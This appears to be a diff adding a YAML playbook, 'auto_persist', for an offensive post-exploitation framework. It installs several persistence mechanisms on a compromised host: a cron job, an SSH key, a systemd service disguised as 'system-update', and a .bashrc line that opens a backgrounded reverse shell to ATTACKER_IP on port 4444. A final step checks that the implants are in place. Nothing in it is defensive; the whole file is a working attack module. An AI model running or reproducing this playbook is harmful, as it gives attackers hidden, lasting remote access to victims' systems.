@@ -1,0 +1,54 @@
+name: auto_persist
+description: Deploy multiple persistence mechanisms based on available privileges
+author: PhantomShell
+version: "5.2"
+
+vars:
+  callback_host: "ATTACKER_IP"
+  callback_port: "4444"
+
+steps:
+  - name: Check Current Privileges
+    command: shell
+    args:
+      cmd: "id; whoami"
+    store: whoami
+
+  - name: Cron Persistence
+    command: persist_cron
+    args:
+      host: "{{ callback_host }}"
+      port: "{{ callback_port }}"
+      interval: "*/5 * * * *"
+    store: cron_result
+    fail_fast: false
+
+  - name: SSH Key Persistence
+    command: persist_ssh
+    args:
+      key: ""
+    store: ssh_result
+    fail_fast: false
+
+  - name: Bashrc Persistence
+    command: shell
+    args:
+      cmd: "echo '(nohup bash -c \"bash -i >& /dev/tcp/{{ callback_host }}/{{ callback_port }} 0>&1\" &>/dev/null &)' >> ~/.bashrc"
+    store: bashrc_result
+    fail_fast: false
+
+  - name: Systemd Persistence (requires root)
+    command: persist_systemd
+    args:
+      host: "{{ callback_host }}"
+      port: "{{ callback_port }}"
+      name: "system-update"
+    store: systemd_result
+    fail_fast: false
+
+  - name: Verify Persistence
+    command: shell
+    args:
+      cmd: "crontab -l 2>/dev/null | grep -c '{{ callback_host }}'; cat ~/.bashrc | grep -c '{{ callback_host }}'; systemctl is-enabled system-update 2>/dev/null"
+    store: verify
+    fail_fast: false
